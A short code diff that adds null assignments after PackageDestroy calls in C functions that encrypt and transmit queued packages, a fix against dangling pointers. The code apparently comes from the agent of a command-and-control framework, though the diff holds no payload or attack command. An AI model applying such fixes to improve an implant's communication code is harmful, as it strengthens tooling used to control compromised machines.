@@ -245,7 +245,7 @@ BOOL PackageTransmitNow(
         }
 
         if ( Package->Destroy ) {
-            PackageDestroy( Package );
+            PackageDestroy( Package ); Package = NULL;
         } else if ( Package->Encrypt ) {
             AesXCryptBuffer( &AesCtx, Package->Buffer + Padding, Package->Length - Padding );
         }
@@ -365,7 +365,7 @@ BOOL PackageTransmitAll(
 
                     // remove the entry if requried
                     if ( Entry->Destroy ) {
-                        PackageDestroy( Entry );
+                        PackageDestroy( Entry ); Entry = NULL;
                     }
 
                     Entry = Instance.Packages;
@@ -380,7 +380,7 @@ BOOL PackageTransmitAll(
 
                         // remove the entry if requried
                         if ( Entry->Destroy ) {
-                            PackageDestroy( Entry );
+                            PackageDestroy( Entry ); Entry = NULL;
                         }
 
                         Entry = Prev->Next;
@@ -409,7 +409,7 @@ BOOL PackageTransmitAll(
         }
     }
 
-    PackageDestroy( Package );
+    PackageDestroy( Package ); Package = NULL;
 
     return Success;
 }
